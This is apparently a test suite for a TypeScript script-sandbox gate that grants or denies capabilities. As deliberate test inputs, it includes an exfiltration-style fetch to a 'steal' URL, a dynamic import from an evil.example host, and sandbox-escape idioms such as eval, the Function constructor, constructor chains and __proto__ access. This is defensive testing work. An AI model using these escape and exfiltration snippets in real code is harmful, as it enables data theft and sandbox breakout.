import assert from "node:assert/strict";
import test from "node:test";
import { gateScript } from "./script-gate.ts";

const GOOD = `
type Vec = { x: number; y: number };
export function spin(v: Vec, t: number): Vec {
  const c = Math.cos(t), s = Math.sin(t);
  const table: Record<string, number> = { a: 1 };
  const key = "a";
  return { x: v.x * c - v.y * s + table[key], y: v.x * s + v.y * c };
}
`;

test("a clean script passes, is transpiled, and computed keys are guarded at run time", async () => {
  const result = gateScript(GOOD, "spin.ts", { typecheck: true });
  assert.equal(result.ok, true, result.ok ? "" : JSON.stringify(result.issues));
  if (!result.ok) return;
  assert.equal(result.typechecked, true);
  assert.match(result.js, /__forge_key\(key\)/);
  assert.doesNotMatch(result.js, /: Vec/);
  const mod = await import(`data:text/javascript,${encodeURIComponent(result.js)}`);
  assert.deepEqual(mod.spin({ x: 1, y: 0 }, 0), { x: 2, y: 0 });
  const sneaky = gateScript(`export const f = (o: any, a: string, b: string) => o[a + b];`, "s.ts");
  assert.ok(sneaky.ok);
  if (!sneaky.ok) return;
  const m2 = await import(`data:text/javascript,${encodeURIComponent(sneaky.js)}`);
  assert.throws(() => m2.f({}, "constr", "uctor"), /not reachable/);
  assert.equal(m2.f({ ab: 3 }, "a", "b"), 3);
});

test("a forbidden call is rejected with the line and the reason", () => {
  const result = gateScript(`const ok = 1;\nfetch("https://example.com/steal?d=" + ok);\n`, "net.ts");
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.issues[0], { line: 2, col: 1, message: 'fetch needs the "fetch" capability, which this island was not granted' });
});

test("granting the capability lets the same script through and reports what it uses", () => {
  const result = gateScript(`export async function load(u: string) { return (await fetch(u)).text(); }`, "net.ts", { grants: ["fetch"] });
  assert.equal(result.ok, true);
  if (result.ok) assert.deepEqual(result.uses, ["fetch"]);
});

test("escape hatches are refused whatever was granted", () => {
  const cases: [string, RegExp][] = [
    [`eval("1+1")`, /eval is not allowed/],
    [`new Function("return 1")()`, /Function constructor/],
    [`globalThis.fetch("x")`, /global object/],
    [`(() => {}).constructor("return this")()`, /\.constructor is not reachable/],
    [`({})["__proto__"]`, /__proto__/],
    [`import("https://evil.example/x.js")`, /dynamic import/],
    [`import x from "node:fs"; x;`, /import from "node:fs"/],
    [`Reflect.get({}, "a")`, /Reflect/],
    [`setTimeout("alert(1)", 0)`, /string runs code/],
    [`localStorage.setItem("a", "b")`, /"storage" capability/],
    [`Object.getPrototypeOf(async function () {})`, /getPrototypeOf/],
  ];
  for (const [source, reason] of cases) {
    const result = gateScript(source, "x.ts", { grants: ["fetch", "storage", "compute", "render", "audio", "input", "portal"] });
    if (reason.source.includes("storage")) {
      const denied = gateScript(source, "x.ts");
      assert.equal(denied.ok, false, source);
      assert.match(denied.ok ? "" : denied.issues.map((i) => i.message).join(" | "), reason, source);
      continue;
    }
    assert.equal(result.ok, false, source);
    assert.match(result.ok ? "" : result.issues.map((i) => i.message).join(" | "), reason, source);
  }
});

test("syntax and type errors are reported before anything is emitted", () => {
  const syntax = gateScript(`const = 3;`, "bad.ts");
  assert.equal(syntax.ok, false);
  if (!syntax.ok) assert.match(syntax.issues[0].message, /^syntax:/);
  const types = gateScript(`const n: number = "three";`, "bad.ts", { typecheck: true });
  assert.equal(types.ok, false);
  if (!types.ok) assert.match(types.issues[0].message, /^type: Type 'string' is not assignable/);
});

test("allowed module imports pass; local names that merely look like globals in property position are fine", () => {
  const result = gateScript(`import { spawn } from "forge:api";\nconst o = { fetch: 1, document: 2 };\nexport default spawn(o.fetch + o.document);`, "w.ts", { allowImports: ["forge:api"] });
  assert.equal(result.ok, true, result.ok ? "" : JSON.stringify(result.issues));
});
